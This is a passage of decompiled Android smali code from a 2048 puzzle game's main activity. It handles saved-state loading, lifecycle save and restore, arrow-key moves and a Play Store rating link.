    move-result-object v0

    .line 152
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    const/4 v2, 0x0

    const-string v3, "save_state"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    iput-boolean v0, v1, Laarkay/a2048game/MainView;->hasSaveState:Z

    if-eqz p1, :cond_3

    const-string v0, "hasState"

    .line 155
    invoke-virtual {p1, v0}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_3

    .line 156
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->load()V

    .line 161
    :cond_3
    new-instance p1, Laarkay/a2048game/MainActivity$3;

    invoke-direct {p1, p0}, Laarkay/a2048game/MainActivity$3;-><init>(Laarkay/a2048game/MainActivity;)V

    iput-object p1, p0, Laarkay/a2048game/MainActivity;->t:Ljava/lang/Thread;

    .line 181
    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 2

    const/4 v0, 0x1

    const/16 v1, 0x52

    if-ne p1, v1, :cond_0

    return v0

    :cond_0
    const/16 v1, 0x14

    if-ne p1, v1, :cond_1

    .line 191
    iget-object p1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object p1, p1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    const/4 p2, 0x2

    invoke-virtual {p1, p2}, Laarkay/a2048game/MainGame;->move(I)V

    return v0

    :cond_1
    const/16 v1, 0x13

    if-ne p1, v1, :cond_2

    .line 194
    iget-object p1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object p1, p1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    const/4 p2, 0x0

    invoke-virtual {p1, p2}, Laarkay/a2048game/MainGame;->move(I)V

    return v0

    :cond_2
    const/16 v1, 0x15

    if-ne p1, v1, :cond_3

    .line 197
    iget-object p1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object p1, p1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    const/4 p2, 0x3

    invoke-virtual {p1, p2}, Laarkay/a2048game/MainGame;->move(I)V

    return v0

    :cond_3
    const/16 v1, 0x16

    if-ne p1, v1, :cond_4

    .line 200
    iget-object p1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object p1, p1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    invoke-virtual {p1, v0}, Laarkay/a2048game/MainGame;->move(I)V

    return v0

    .line 203
    :cond_4
    invoke-super {p0, p1, p2}, Landroidx/appcompat/app/AppCompatActivity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result p1

    return p1
.end method

.method protected onPause()V
    .locals 1

    .line 215
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onPause()V

    .line 216
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->save()V

    const/4 v0, 0x0

    .line 217
    sput-boolean v0, Laarkay/a2048game/MainActivity;->running:Z

    return-void
.end method

.method protected onResume()V
    .locals 1

    .line 222
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onResume()V

    .line 223
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->load()V

    const/4 v0, 0x1

    .line 224
    sput-boolean v0, Laarkay/a2048game/MainActivity;->running:Z

    return-void
.end method

.method public onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 2

    .line 208
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onSaveInstanceState(Landroid/os/Bundle;)V

    const-string v0, "hasState"

    const/4 v1, 0x1

    .line 209
    invoke-virtual {p1, v0, v1}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 210
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->save()V

    return-void
.end method

.method protected onStop()V
    .locals 1

    .line 229
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onStop()V

    .line 230
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->save()V

    const/4 v0, 0x0

    .line 231
    sput-boolean v0, Laarkay/a2048game/MainActivity;->running:Z

    return-void
.end method

.method public rateApp()V
    .locals 1

    :try_start_0
    const-string v0, "market://details"

    .line 314
    invoke-direct {p0, v0}, Laarkay/a2048game/MainActivity;->rateIntentForUrl(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 315
    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-string v0, "https://play.google.com/store/apps/details"

    .line 317
    invoke-direct {p0, v0}, Laarkay/a2048game/MainActivity;->rateIntentForUrl(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 318
    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->startActivity(Landroid/content/Intent;)V

    :goto_0
    return-void
.end method
